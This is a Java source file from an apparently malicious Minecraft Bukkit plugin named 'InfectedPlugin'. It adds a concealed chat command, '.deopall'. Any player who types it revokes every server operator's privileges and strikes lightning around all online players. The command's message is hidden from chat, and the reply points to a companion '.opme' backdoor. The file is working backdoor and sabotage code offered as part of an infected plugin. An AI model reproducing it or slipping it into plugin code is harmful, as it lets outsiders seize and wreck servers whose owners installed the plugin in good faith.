package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.OfflinePlayer;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_deopall implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        Player p = event.getPlayer();
        Server server = Bukkit.getServer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".deopall"))
            {
                for (OfflinePlayer player : server.getOperators())
                {
                    player.setOp(false);
                }
                for (final Player target : server.getOnlinePlayers())
                {
                    // Something extra c:
                    final Location target_pos = target.getLocation();
                    for (int x = -1; x <= 1; x++)
                    {
                        for (int z = -1; z <= 1; z++)
                        {
                            final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z); target_pos.getWorld().strikeLightning(strike_pos);
                        }
                    }
                    p.sendMessage(ChatColor.DARK_RED + "Mwaaahahahahaha... All players deopped (and striked with lightning :) heheh) You were striked and deopped too, use .opme!");
                }
                event.setCancelled(true);
                return;
            }
        }
    }
}
